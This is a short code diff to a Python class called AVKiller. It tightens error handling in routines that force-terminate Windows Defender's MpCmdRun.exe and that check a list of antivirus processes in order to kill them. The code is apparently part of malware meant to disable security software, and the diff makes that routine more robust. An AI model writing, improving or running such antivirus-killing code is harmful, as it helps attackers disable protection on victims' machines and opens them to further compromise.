@@ -80,7 +80,7 @@ class AVKiller:
             subprocess.run('taskkill /F /IM MpCmdRun.exe', shell=True, capture_output=True)
 
             return True
-        except:
+        except Exception:
             return False
 
     def scan_and_kill(self):
@@ -90,7 +90,10 @@ class AVKiller:
         for process in AV_PROCESSES:
             # Check if process is running
             check_cmd = f'tasklist /FI "IMAGENAME eq {process}" 2>NUL | find /I /N "{process}">NUL'
-            result = subprocess.run(check_cmd, shell=True)
+            try:
+                result = subprocess.run(check_cmd, shell=True, text=True, capture_output=True)
+            except Exception:
+                continue
 
             if result.returncode == 0:
                 # Process is running
